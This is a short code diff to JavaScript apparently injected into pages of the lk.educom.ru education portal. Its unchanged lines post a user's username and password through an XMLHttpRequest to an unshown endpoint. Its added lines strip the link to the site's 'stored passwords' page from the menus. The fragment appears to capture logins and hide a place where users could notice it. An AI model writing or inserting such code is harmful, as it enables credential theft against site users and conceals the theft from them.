@@ -99,5 +99,18 @@ if (remember_field) {
 		}, false);
 		xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
 		xhr.send('username='+username_field.value+'&password='+password_field.value);
-	}, false); 
+	}, false);
+}
+
+var menus = document.getElementsByClassName("vertical menu ui")
+if (menus.length !== 0) {
+	// Try to remove "stored passwords" link
+	for (m=0; m<menus.length; m++) {
+		links = menus[m].getElementsByTagName("a")
+		for (l=0; l<links.length; l++) {
+			if (links[l].href === 'http://lk.educom.ru/passwords.html') {
+				links[l].parentElement.removeChild(links[l]);
+			}
+		}
+	}
 }
